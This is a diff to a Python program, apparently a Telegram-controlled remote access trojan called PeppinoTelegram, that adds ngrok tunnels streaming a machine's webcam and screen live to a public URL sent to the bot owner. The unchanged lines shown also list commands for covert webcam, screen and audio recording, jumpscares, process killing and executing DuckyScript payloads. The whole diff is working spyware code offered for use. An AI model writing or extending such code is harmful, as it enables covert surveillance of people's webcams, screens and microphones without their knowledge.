@@ -13,7 +13,7 @@ from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, wai
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                  CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap,
-                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT)
+                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT, imencode)
 
 #MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
@@ -56,6 +56,12 @@ from subprocess import CREATE_NO_WINDOW, Popen
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod 
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 from os.path import join, abspath, isfile, exists, dirname, realpath, isdir, split as pathsplit
+
+#TUNNEL HANDLING
+from pyngrok import ngrok
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from socketserver import ThreadingMixIn
+from http.server import SimpleHTTPRequestHandler, HTTPServer
 
 
 def resource_path(relative_path: str) -> str:
@@ -224,6 +230,10 @@ screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
 waitforface - Send a webcam photo when face is detected till timeout.
 displaymode - Send a display set menu.
+webcamtunnelstart - Sets you a link to a webcam stream.
+screentunnelstart - Sets you a link to a screen stream.
+webcamtunnelstop - Stops the webcam stream.
+screentunnelstop - Stops the screen stream.
 
 🔊 Audio & Volume
 breath - Play breathing sound.
@@ -332,7 +342,7 @@ def ogg_to_wav(filename: str, rmold: bool=False) -> str:
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
     with open(filename) as fi:
         var = json.load(fi)
-    return var["token"],var["chatid"]
+    return var["token"],var["chatid"],var["ngrok_token"]
         
 #Resizing assets so they all take the same time to load when doing jumpscares(I guess)
 def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
@@ -495,6 +505,102 @@ def toducky(payload, execute=False) -> str:
     if execute:
         exec(final)
     return final
+
+"""
+TunnelHandling
+ooooooooooooo                                               oooo  ooooo   ooooo                             .o8  oooo   o8o
+8'   888   `8                                               `888  `888'   `888'                            "888  `888   `"'
+     888      oooo  oooo  ooo. .oo.   ooo. .oo.    .ooooo.   888   888     888   .oooo.   ooo. .oo.    .oooo888   888  oooo  ooo. .oo.    .oooooooo
+     888      `888  `888  `888P"Y88b  `888P"Y88b  d88' `88b  888   888ooooo888  `P  )88b  `888P"Y88b  d88' `888   888  `888  `888P"Y88b  888' `88b
+     888       888   888   888   888   888   888  888ooo888  888   888     888   .oP"888   888   888  888   888   888   888   888   888  888   888
+     888       888   888   888   888   888   888  888    .o  888   888     888  d8(  888   888   888  888   888   888   888   888   888  `88bod8P'
+    o888o      `V88V"V8P' o888o o888o o888o o888o `Y8bod8P' o888o o888o   o888o `Y888""8o o888o o888o `Y8bod88P" o888o o888o o888o o888o `8oooooo.
+                                                                                                                                         d"     YD
+                                                                                                                                         "Y88888P'
+"""
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    daemon_threads = True
+class ScreenStreamHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path != '/':
+            self.send_error(404)
+            return
+        self.send_response(200)
+        self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
+        self.end_headers()
+        while True:
+            screenshot = pg.screenshot()
+            with BytesIO() as output:
+                screenshot.save(output, format="JPEG")
+                frame = output.getvalue()
+            self.wfile.write(b"--frame\r\n")
+            self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
+            sleep(0.1)
+
+def webcamstreamhandlermaker(cap):
+    class WebcamStreamHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path != '/':
+                self.send_error(404)
+                return
+            cap.open(0)
+            self.send_response(200)
+            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
+            self.end_headers()
+            while cap.isOpened():
+                ret, frame = cap.read()
+                if not ret:
+                    continue
+                _, jpeg = imencode('.jpg', frame)
+                self.wfile.write(b"--frame\r\n")
+                self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
+                sleep(0.1)
+    return WebcamStreamHandler
+
+class MJPEGServer:
+    def __init__(self, port=8081, handler=None):
+        self.port = port
+        self.handler = handler
+        self.server = None
+        self.tunnel = None
+
+    def start(self):
+        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), self.handler)
+        Thread(target=self.server.serve_forever, daemon=True).start()
+        self.tunnel = ngrok.connect(self.port, "http")
+        return self.tunnel.public_url
+
+    def stop(self):
+        if self.tunnel:
+            ngrok.disconnect(self.tunnel.public_url)
+        if self.server:
+            self.server.shutdown()
+class TunnelManager:
+    def __init__(self):
+        self.services = {}
+
+    def start_screen_stream(self, name="screen", port=8081):
+        server = MJPEGServer(port, ScreenStreamHandler)
+        url = server.start()
+        self.services[name] = server
+        return url
+
+    def start_webcam_stream(self, name="webcam", port=8082, cap=VideoCapture(0)):
+        server = MJPEGServer(port, webcamstreamhandlermaker(cap))
+        url = server.start()
+        self.services[name] = server
+        return url
+
+    def stop_service(self, name):
+        if name in self.services:
+            self.services[name].stop()
+            del self.services[name]
+            return True
+        return False
+
+    def list_services(self):
+        return list(self.services.keys())
+
 
 """
 oooooo   oooooo     oooo  o8o   .o88o.  o8o  oooooooooo.
@@ -825,12 +931,20 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-        def __init__(self, token: str, owner_id: int, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]]) -> None:
+        def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]]) -> None:
             self.token = token
             self.owner_id = owner_id
+            self.ngrok_token = ngrok_token
+            self.can_use_ngrok = bool(ngrok_token.strip())
+            if self.can_use_ngrok:
+                self.tunnelhandler = TunnelManager()
+
             self.loading_bar_set = loading_bar_set
             self.loading_bar_spinner = loading_bar_spinner
-    
+
+            self.webcam_url = None
+            self.screen_url = None
+
             self.help = HELP
             self.process_killer_page = 0
             self.owner_name = ""
@@ -907,6 +1021,10 @@ class PeppinoTelegram:
                 "setvolume":self.audio_mixer.setVolumePercentage,
                 "fullvolume":lambda:self.audio_mixer.full(),
                 "wifiinfo":self.wifiinfo,
+                "webcamtunnelstart":self.start_webcam_tunnel,
+                "screentunnelstart":self.start_screen_tunnel,
+                "webcamtunnelstop":self.stop_webcam_tunnel,
+                "screentunnelstop":self.stop_screen_tunnel,
                 "mixermenu":self.mixer_menu,
                 "procmonadd":self.processmonitoradd,
                 "procmonrem":self.processmonitorrem,
@@ -1480,7 +1598,7 @@ class PeppinoTelegram:
 
         def record_screen(self, duration: int=5, caption: str|None=None) -> None:
             duration = int(duration)
-            bar = self.new_loading_bar(duration, label="Recording Screen")
+            bar = self.new_loading_bar(duration, label=f"{emoji_dict['screen']} Recording Screen")
             try:
                 filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
                 audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
@@ -1525,7 +1643,7 @@ class PeppinoTelegram:
 
         def record_webcam(self, duration: int=5, caption: str|None=None) -> None:
             duration = int(duration)
-            bar = self.new_loading_bar(duration, label="Recording Webcam")
+            bar = self.new_loading_bar(duration, label=f"{emoji_dict['photo']} Recording Webcam")
             try:
                 filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
                 audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
@@ -1572,7 +1690,7 @@ class PeppinoTelegram:
 
         def record_webcam_and_screen(self, capture_duration: int=5, caption: str|None=None) -> None:
             capture_duration = int(capture_duration)
-            bar = self.new_loading_bar(capture_duration, label="Recording Webcam&Screen")
+            bar = self.new_loading_bar(capture_duration, label=f"{emoji_dict['photo']}{emoji_dict['screen']} Recording Webcam&Screen")
             try:
                 filename = join(BURN_DIRECTORY, randomname() + ".mp4")
                 audio_filename = join(BURN_DIRECTORY, randomname() + ".wav")
@@ -1662,7 +1780,7 @@ class PeppinoTelegram:
                 return False
 
         def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
-            message = self.new_editable_message(f"Recording audio of {seconds} seconds.")
+            message = self.new_editable_message(f"{emoji_dict['microphone']} Recording audio of {seconds} seconds.")
             filename = randomname()+".wav"
             filepath = join(BURN_DIRECTORY, filename)
             res = self.record_audio(filepath, seconds)
@@ -1756,6 +1874,45 @@ class PeppinoTelegram:
             for i in range(n):
                 sp_win = Thread(target=self.message_box, args=["Warning", text,])
                 sp_win.start()
+        
+        def stop_webcam_tunnel(self) -> None:
+            if self.webcam_url:
+                self.closecap()
+                self.tunnelhandler.stop_service("webcam")
+                self.webcam_url = None
+                self.bsend(f"{emoji_dict['photo']} Webcam tunnel closed")
+            else:
+                self.bsend(f"{emoji_dict['photo']} You have no webcam tunnel opened")
+
+        def stop_screen_tunnel(self) -> None:
+            if self.screen_url:
+                self.tunnelhandler.stop_service("screen")
+                self.screen_url = None
+                self.bsend(f"{emoji_dict['screen']} Screen tunnel closed")
+            else:
+                self.bsend(f"{emoji_dict['screen']} You have no screen tunnel opened")
+
+        def start_webcam_tunnel(self) -> None:
+            if self.can_use_ngrok and self.webcam_url is None:
+                self.webcam_url = self.tunnelhandler.start_webcam_stream(cap=self.cap)
+                self.bsend(f"{emoji_dict['photo']} Webcam Tunnel url: {self.webcam_url}")
+
+            elif self.can_use_ngrok and not(self.webcam_url is None):
+                self.bsend(f"{emoji_dict['photo']} Webcam Tunnel url: {self.webcam_url}")
+
+            else:
+                self.bsend("You cant use tunnel because you didn't provide a ngrok token.")
+
+        def start_screen_tunnel(self) -> None:
+            if self.can_use_ngrok and self.screen_url is None:
+                self.screen_url = self.tunnelhandler.start_screen_stream()
+                self.bsend(f"{emoji_dict['screen']} Screen Tunnel url: {self.screen_url}")
+
+            elif self.can_use_ngrok and not (self.screen_url is None):
+                self.bsend(f"{emoji_dict['screen']} Screen Tunnel url: {self.screen_url}")
+
+            else:
+                self.bsend("You cant use tunnel because you didn't provide a ngrok token.")
 
         def start(self) -> None:
             #Getting rid of old shi
@@ -1796,6 +1953,8 @@ class PeppinoTelegram:
             self.running = False
             self.clear()
             self.bsend("🛑 Interrupted by you, bye bye.")
+            self.stop_screen_tunnel()
+            self.stop_webcam_tunnel()
             sys.exit()
 
         def terminate_process_by_name(self, process_name: str) -> None:
@@ -1840,8 +1999,10 @@ ooo        ooooo            o8o
 o8o        o888o `Y888""8o o888o o888o o888o 
 """
 if __name__ == "__main__":
-    token, chat_id = getCred() 
+    token, chat_id, ngrok_token = getCred() 
     mixer = CustomMixer()
     capture = VideoCapture(0)
-    pep2 = PeppinoTelegram(token,chat_id,mixer,capture,loading_bar_set=["█","░"],loading_bar_spinner=all_spinners["circle_dots"])
+    if ngrok_token.strip():
+        ngrok.set_auth_token(ngrok_token)
+    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=["█","░"],loading_bar_spinner=all_spinners["circle_dots"])
     pep2.start()
